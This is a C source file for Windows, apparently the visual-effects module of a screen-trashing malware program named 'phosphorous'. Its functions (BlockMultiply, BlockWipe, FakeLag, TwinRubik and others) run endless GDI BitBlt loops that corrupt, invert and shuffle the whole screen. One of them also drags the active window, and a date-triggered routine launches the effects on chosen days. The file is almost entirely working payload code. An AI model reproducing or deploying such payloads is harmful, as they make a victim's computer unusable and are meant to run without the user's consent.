#include "phosphorous.h"

VOID BlockMultiply() {
	DWORD dwPos2 = 0;
	HDC hScreen = GetDC(NULL);
	RECT rcScreenSize = GetScreenSize();
	for (;;) {
		for (INT c = 0; c < rcScreenSize.right; c += 9) {
			if ((xorshift() % 10) != 6) BitBlt(hScreen, dwPos2, 0, c, rcScreenSize.bottom, hScreen, rcScreenSize.right - c, rcScreenSize.bottom - c, MERGECOPY);
			else BitBlt(hScreen, dwPos2, 0, c, rcScreenSize.bottom, hScreen, rcScreenSize.right - c, rcScreenSize.bottom - c, SRCINVERT);

			if (((xorshift() % 100) + 1) >= 50) BitBlt(hScreen, dwPos2, 0, c, rcScreenSize.bottom, hScreen, rcScreenSize.right - c, rcScreenSize.bottom - c, SRCAND);
			else BitBlt(hScreen, dwPos2, 0, c, rcScreenSize.bottom, hScreen, rcScreenSize.right - c, rcScreenSize.bottom - c, SRCERASE);

			if (dwPos2 < rcScreenSize.right) dwPos2 += 12;
			else dwPos2 = 0;
		}
		Sleep(1);
	}
}
//dpi aware lol
DWORD WINAPI InvertedCross(LPVOID lpParam) {
	RECT ScreenSize = GetScreenSize(),
		Rect1 = { ScreenSize.right / 2,ScreenSize.top,ScreenSize.right / 2 + 100 ,ScreenSize.bottom },
		Rect2 = { Rect1.left - 250,ScreenSize.bottom - 300,Rect1.right + 250 ,ScreenSize.bottom - 200 };

	HDC hDC = GetDC(NULL);
	UINT8 uRed = 255;
	DWORD dwInvert = 0;

	for (;;) {
		HBRUSH hBrush = CreateSolidBrush(RGB(uRed, 0, 0));
		FillRect(hDC, &Rect1, hBrush);
		FillRect(hDC, &Rect2, hBrush);
		if (uRed == 255) dwInvert = 0;
		if (uRed == 0) dwInvert = 1;
		if (dwInvert) uRed++;
		else uRed--;
		DeleteObject(hBrush);
	}
}

VOID BlockWipe() {
	HDC hDC = GetDC(NULL);
	RECT rSS = GetScreenSize();
	HWND hActiveWindow;
	RECT AWRect;

	for(;;)
	for (INT i = 0; i <= rSS.right / 4; i += 5) {
		switch (i % 3) {
		case (0): BitBlt(hDC, rSS.left, rSS.top + ((INT)xorshift() % 5 - 2), rSS.right + i, rSS.bottom + ((INT)xorshift() % 5 - 2), hDC, 1 + rSS.left, rSS.top + ((INT)xorshift() % 5 - 2), SRCAND);
			break;
		case (1): BitBlt(hDC, rSS.left, rSS.top + ((INT)xorshift() % 5 - 2), rSS.right + i, rSS.bottom + ((INT)xorshift() % 5 - 2), hDC, 1 + rSS.left + i, rSS.top + ((INT)xorshift() % 5 - 2), SRCPAINT);
			break;
		case (2): BitBlt(hDC, rSS.left, rSS.top + ((INT)xorshift() % 5 - 2), rSS.right + i, rSS.bottom + ((INT)xorshift() % 5 - 2), hDC, 1 + rSS.left + i, rSS.top + ((INT)xorshift() % 5 - 2), SRCERASE);
			break;
		}
		hActiveWindow = GetActiveWindow();
		if (hActiveWindow) {
			GetWindowRect(hActiveWindow, &AWRect);
			SetWindowPos(hActiveWindow, GetDesktopWindow(), AWRect.left - 1, AWRect.top, AWRect.right - 1, AWRect.bottom, SWP_NOZORDER);
		}
	};
}

VOID TwinCascade() {
	HDC hScreen = GetDC(NULL);
	DWORD dwSegments[8], dwCycleCount = 0;
	RECT screenSize = GetScreenSize();
	for (DWORD dwIdx = 0; dwIdx < 8; dwIdx++)
		dwSegments[dwIdx] = screenSize.bottom / 8 * (dwIdx + 1);

	for (DWORD dwIdx = 0;; dwIdx = (dwIdx + 1) % 8) {
		if (dwIdx != 0)
			BitBlt(hScreen, 0, dwSegments[dwIdx], screenSize.right, dwSegments[dwIdx - 1], hScreen, 0, dwSegments[(dwIdx + 1) % 8], SRCINVERT);
		else
			BitBlt(hScreen, 0, dwSegments[0], screenSize.right, dwSegments[1], hScreen, 0, dwSegments[1], NOTSRCCOPY);
		Sleep(10);
	}

}

VOID FakeLag() {
	HDC hDC = GetDC(NULL);
	RECT ScreenSize = GetScreenSize();
	for (DWORD dwCount = 0;; dwCount++) {
		BitBlt(hDC, ScreenSize.left, ScreenSize.top, ScreenSize.right, ScreenSize.bottom, hDC, ScreenSize.left, ScreenSize.top, SRCAND);
		if (dwCount % 100 == 99) BitBlt(hDC, ScreenSize.left, ScreenSize.top, ScreenSize.right, ScreenSize.bottom, hDC, ScreenSize.left, ScreenSize.top, NOTSRCCOPY);
		if (dwCount > 500) BitBlt(hDC, ScreenSize.left + 3, ScreenSize.top + 3, ScreenSize.right + 3, ScreenSize.bottom + 3, hDC, ScreenSize.left, ScreenSize.top, NOTSRCERASE);
		if (dwCount > 100) BitBlt(hDC, xorshift() % ScreenSize.right + 1, xorshift() % ScreenSize.bottom, xorshift() % ScreenSize.right + 1, xorshift() % ScreenSize.bottom, hDC, xorshift() % ScreenSize.right + 1, xorshift() % ScreenSize.bottom, SRCCOPY);
		Sleep(1);
	}
}

VOID TwinRubik() {
	HDC hScreen = GetDC(NULL);
	DWORD dwCuttingLines[4], dwSourceRect, dwDestRect;
	RECT screenSize = GetScreenSize(), lpChunks[9];
	//Zero-fill struct array
	lmemset(lpChunks, 0, sizeof(RECT) * 9);
	//Calculate placement of cutting lines
	dwCuttingLines[0] = screenSize.right / 3;
	dwCuttingLines[1] = dwCuttingLines[0] * 2;
	dwCuttingLines[2] = screenSize.bottom / 3;
	dwCuttingLines[3] = dwCuttingLines[2] * 2;
	//Generate chunks based on cutting lines
	//top row
	lpChunks[0].right = dwCuttingLines[0];
	lpChunks[0].bottom = dwCuttingLines[2];
	lpChunks[1].left = dwCuttingLines[0];
	lpChunks[1].bottom = dwCuttingLines[2];
	lpChunks[1].right = dwCuttingLines[1];
	lpChunks[2].left = dwCuttingLines[1];
	lpChunks[2].bottom = dwCuttingLines[2];
	lpChunks[2].right = screenSize.right;
	//middle row 
	lpChunks[3].top = dwCuttingLines[2];
	lpChunks[3].bottom = dwCuttingLines[3];
	lpChunks[3].right = dwCuttingLines[0];
	lpChunks[4].top = dwCuttingLines[2];
	lpChunks[4].left = dwCuttingLines[0];
	lpChunks[4].bottom = dwCuttingLines[3];
	lpChunks[4].right = dwCuttingLines[1];
	lpChunks[5].top = dwCuttingLines[2];
	lpChunks[5].left = dwCuttingLines[1];
	lpChunks[5].bottom = dwCuttingLines[3];
	lpChunks[5].right = screenSize.right;
	//bottom row
	lpChunks[6].top = dwCuttingLines[3];
	lpChunks[6].bottom = screenSize.bottom;
	lpChunks[6].right = dwCuttingLines[0];
	lpChunks[7].top = dwCuttingLines[3];
	lpChunks[7].bottom = screenSize.bottom;
	lpChunks[7].right = dwCuttingLines[2];
	lpChunks[7].left = dwCuttingLines[1];
	lpChunks[8].top = dwCuttingLines[3];
	lpChunks[8].bottom = screenSize.bottom;
	lpChunks[8].left = dwCuttingLines[2];
	lpChunks[8].right = screenSize.right;
	//got rects, time to start shuffling
	for (DWORD dwDelay = 1000;; dwDelay -= dwDelay / 4) {
		dwSourceRect = xorshift() % 9;	 //MUST BE CALLED SEPARATELY ! OTHERWISE THEY
		dwDestRect = xorshift() % 9;	//WOULD HAVE AN EQUAL VALUE AND NOTHING WOULD HAPPEN ! 
		BitBlt(hScreen, lpChunks[dwDestRect].left, lpChunks[dwDestRect].top, lpChunks[dwDestRect].right, lpChunks[dwDestRect].bottom, hScreen, lpChunks[dwSourceRect].right, lpChunks[dwSourceRect].bottom, DSTINVERT);
		BitBlt(hScreen, lpChunks[dwDestRect].left, lpChunks[dwDestRect].top, lpChunks[dwDestRect].right, lpChunks[dwDestRect].bottom, hScreen, lpChunks[dwSourceRect].right, lpChunks[dwSourceRect].bottom, SRCPAINT);
		Sleep(dwDelay);
	}
}
VOID LaunchGraphicalPayloads(SYSTEMTIME systime) {
	FakeLag();
	if (systime.wDay == 24 && systime.wMonth == 12)
		mkthread(InvertedCross, 0);
	else if (systime.wDay == 7 && systime.wMonth == 8)
		BlockMultiply();
	else if (systime.wDay == 8 && systime.wMonth == 10) {
		mkthread((LPTHREAD_START_ROUTINE)TwinCascade, 0);
		TwinRubik();
	}
	else if (systime.wDay == 24 && systime.wMonth == 11)
		BlockWipe();
	else if (systime.wDay == 26 && systime.wMonth == 11)
		FakeLag();

	Sleep(-1);
}	